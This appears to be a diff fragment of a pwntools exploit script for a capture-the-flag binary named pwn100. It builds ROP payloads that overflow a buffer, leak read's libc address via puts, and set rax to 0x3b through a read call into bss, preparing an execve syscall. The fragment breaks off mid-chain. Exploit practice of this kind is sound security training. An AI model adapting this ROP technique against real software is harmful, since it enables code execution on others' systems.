@@ -8,10 +8,11 @@ pop_ret = 0x0000000000400763
 pop6_ret = 0x000000000040075A
 mov3_call = 0x0000000000400740
 vuln_addr = 0x000000000040068E
-bss_addr = 0x0000000000601040
+bss_addr = 0x0000000000601050
 
 p = process('./pwn100')
 
+#leaking puts's address
 payload1  = 'a' * 0x40 + 'b' * 0x8 + p64(pop_ret) + p64(read_got)
 payload1 += p64(puts_plt) +  p64(vuln_addr) 
 payload1 = payload1.ljust(0xc8, 'a')
@@ -24,6 +25,7 @@ print "read_addr = " + hex(read_addr)
 syscall_addr = read_addr + 0xE
 print "syscall_addr = " + hex(syscall_addr)
 
+#first making rax = 0x3b, we can read 0x3b bytes to bss section, then execute the 0x3 syscall.
 payload2 = 'a' * 0x40 + 'b' * 0x8 + p64(pop6_ret)
 payload2 += p64(0) + p64(1) + p64(read_got) + p64(0x3b) + p64(bss_addr) + p64(0)
 payload2 += p64(mov3_call) + 'c' * 0x8 
